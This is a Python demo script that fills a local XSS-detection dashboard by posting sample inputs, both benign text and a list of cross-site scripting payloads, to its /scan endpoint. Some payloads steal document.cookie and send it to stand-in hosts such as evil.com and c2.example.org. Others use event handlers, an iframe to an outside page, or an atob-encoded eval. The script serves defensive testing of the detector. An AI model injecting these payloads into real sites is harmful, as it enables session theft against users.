"""
populate_dashboard.py  (demo helper)

Sends a realistic mix of submissions to the running dashboard's /scan endpoint
so the screenshot shows many incidents (High, Medium and Low; BLOCK and FLAG),
each with a source IP and target field. Benign inputs are included too; they
are ALLOWed and correctly do not appear in the incident table.

Everything goes through the real hybrid detector (detector.detect).

Usage (dashboard must be running: python src/app.py):
    python src/populate_dashboard.py            # add to existing logs
    python src/populate_dashboard.py --clear    # clear logs first
    python src/populate_dashboard.py --base http://127.0.0.1:5000
"""
import argparse
import sys
import time

import requests

SUBMISSIONS = [
    # (source_ip, field, input)
    ("203.0.113.7",   "comment",  "Great article, thanks for sharing!"),
    ("198.51.100.23", "comment",  "<img src=x onerror=alert(1)>"),
    ("198.51.100.23", "search",   "<script>fetch('http://evil.com/?c='+document.cookie)</script>"),
    ("192.0.2.55",    "username", "';alert(String.fromCharCode(88,83,83))//"),
    ("203.0.113.9",   "search",   "best laptop under 500 dollars"),
    ("198.51.100.77", "comment",  "<svg onload=alert(document.domain)>"),
    ("192.0.2.14",    "profile",  "<a href=\"javascript:alert(1)\">click</a>"),
    ("198.51.100.23", "comment",  "<script>new Image().src='http://c2.example.org/?c='+document.cookie</script>"),
    ("192.0.2.88",    "username", "\"-alert(1)-\""),
    ("203.0.113.40",  "comment",  "<iframe src=http://bad.site/p.html></iframe>"),
    ("198.51.100.91", "search",   "%3Cscript%3Ealert(1)%3C/script%3E"),
    ("192.0.2.55",    "username", "');confirm(1);//"),
    ("203.0.113.7",   "comment",  "Nice work Priya! The part about databases helped me a lot."),
    ("198.51.100.5",  "comment",  "<body onload=eval(atob('YWxlcnQoMSk='))>"),
    ("192.0.2.14",    "profile",  "<div onclick=alert(1)>click"),
    ("198.51.100.77", "search",   "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ("203.0.113.51",  "comment",  "<details open ontoggle=alert(1)>"),
    ("192.0.2.200",   "username", "x=document.cookie;alert(1);//"),
    ("198.51.100.5",  "comment",  "<input onfocus=alert(1) autofocus>"),
    ("203.0.113.9",   "search",   "<SCRIPT>alert('XSS')</SCRIPT>"),
    ("192.0.2.31",    "address",  "12 Park Avenue, Ghaziabad"),
    ("198.51.100.91", "comment",  "<object data=\"http://x.example/x.swf\"></object>"),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://127.0.0.1:5000")
    ap.add_argument("--clear", action="store_true")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    try:
        if args.clear:
            requests.post(f"{base}/api/clear", timeout=5)
        print(f"{'SOURCE':<15} {'FIELD':<9} {'VERDICT':<6} {'SEV':<7} INPUT")
        for ip, field, text in SUBMISSIONS:
            r = requests.post(f"{base}/scan", timeout=10,
                              json={"text": text, "source_id": ip, "target_field": field})
            if r.status_code != 200:
                sys.exit(f"/scan returned {r.status_code}: {r.text[:200]}")
            d = r.json()
            print(f"{ip:<15} {field:<9} {d['verdict']:<6} {(d['severity'] or '-'):<7} {text[:45]!r}")
            time.sleep(0.4)   # distinct timestamps in the table
    except requests.ConnectionError:
        sys.exit(f"Cannot reach {base}. Start the dashboard first: python src/app.py")


if __name__ == "__main__":
    main()